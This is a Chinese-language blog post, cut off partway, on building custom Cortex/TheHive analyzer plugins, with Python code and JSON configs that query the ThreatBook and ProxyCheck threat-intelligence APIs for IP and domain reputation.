<h2 id="如何创建插件"><a href="#如何创建插件" class="headerlink" title="如何创建插件"></a>如何创建插件</h2><p>​    前面有说到<em>Cortex</em>组件默认已经集成了丰富的<em>Analyzers</em>与<em>Responses</em>插件，便于运营人员快速的对安全事件进行分析与响应。在实际使用过程中根据需求场景的不同，我们仍需要进行一些插件的定制化。如何创建插件，官网有很详细的文档介绍，请参考：<a target="_blank" rel="noopener" href="https://github.com/TheHive-Project/CortexDocs/blob/master/api/how-to-create-an-analyzer.md"><em><strong>How to Write and Submit an Analyzer</strong></em></a>。以下附上了部分新增的插件代码：</p>
<p><strong>好了，废话少说，放“码”过来！！！</strong></p>
<h3 id="Analyzers-插件"><a href="#Analyzers-插件" class="headerlink" title="Analyzers - 插件"></a>Analyzers - 插件</h3><h4 id="微歩在线"><a href="#微歩在线" class="headerlink" title="微歩在线"></a>微歩在线</h4><p>​    由于我们已经购买了商业（微歩在线）威胁情报，所以我们也和<em>TheHive</em>进行了整合。</p>
<ul>
<li><em><strong>threatbook.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBook</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: Threat Book</span></span><br><span class="line"><span class="string">    https://x.threatbook.cn/nodev4/vb4/API</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.urls = &#123;</span><br><span class="line">            <span class="string">&#x27;compromise&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/dns&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;reputation&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/ip_reputation&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request an url</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &quot;response_code&quot;: -1,</span></span><br><span class="line"><span class="string">            &quot;verbose_msg&quot;: &quot;Invalid Access IP&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;response_code&#x27;</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(r.json())</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ioc&#x27;</span>: k,</span><br><span class="line">                <span class="string">&#x27;malicious&#x27;</span>: v[<span class="string">&#x27;is_malicious&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;confidence&#x27;</span>: v[<span class="string">&#x27;confidence_level&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: v[<span class="string">&#x27;judgments&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reputation</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting reputation IP&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;reputation&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_compromise</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting compromise IoC&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;compromise&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(<span class="built_in">list</span>(results[<span class="string">&#x27;data&#x27;</span>].values())[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    threat = ThreatBook(key)</span><br><span class="line">    <span class="comment"># reputation</span></span><br><span class="line">    ioc = <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = threat.get_reputation(ioc)</span><br><span class="line">    <span class="comment"># compromise</span></span><br><span class="line">    ioc = <span class="string">&#x27;zzv.no-ip.info&#x27;</span></span><br><span class="line">    r = threat.get_compromise(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>threatbook_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threatbook <span class="keyword">import</span> ThreatBook</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ThreatBook API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.threatbook = ThreatBook(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ThreatBook&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Reputation&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            predicate = <span class="string">&#x27;Compromise&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw:</span><br><span class="line">            <span class="keyword">if</span> raw[<span class="string">&#x27;malicious&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">                level = <span class="string">&quot;malicious&quot;</span></span><br><span class="line">                value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;reputation&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_reputation(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">elif</span> self.service == <span class="string">&#x27;compromise&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.threatbook.get_compromise(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ThreatBookAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ThreatBook_Compromise.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Compromise&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IP、Domain from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;domain&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;compromise&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ThreatBook_Reputation.json</strong></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ThreatBook_Reputation&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the reputation information of IP from ThreatBook.&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataTypeList&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;ip&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ThreatBook/threatbook_analyzer.py&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ThreatBook&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;reputation&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ProxyCheck"><a href="#ProxyCheck" class="headerlink" title="ProxyCheck"></a>ProxyCheck</h4><ul>
<li><em><strong>proxycheck.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheck</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: ProxyCheck</span></span><br><span class="line"><span class="string">    http://proxycheck.io/v2/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.url = <span class="string">&#x27;http://proxycheck.io/v2/&#x27;</span></span><br><span class="line">        self.params = &#123;</span><br><span class="line">            <span class="string">&#x27;vpn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;asn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;time&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;info&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;risk&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;seen&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;days&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;siem&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request ProxyCheck API</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ProxyCheckError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_proxy</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Checking proxy information from proxycheck.io</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        url = self.url + data</span><br><span class="line">        self.params[<span class="string">&#x27;key&#x27;</span>] = self.key</span><br><span class="line">        results = self._request(url=url, params=self.params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, r, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Parsing results</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        intel = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ioc,</span><br><span class="line">                <span class="string">&#x27;country&#x27;</span>: r[ioc][<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;city&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;proxy&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>: r[ioc][<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;provider&#x27;</span>: r[ioc][<span class="string">&#x27;provider&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    proxycheck = ProxyCheck(key)</span><br><span class="line"></span><br><span class="line">    ioc = <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = proxycheck.check_proxy(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>proxycheck_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># 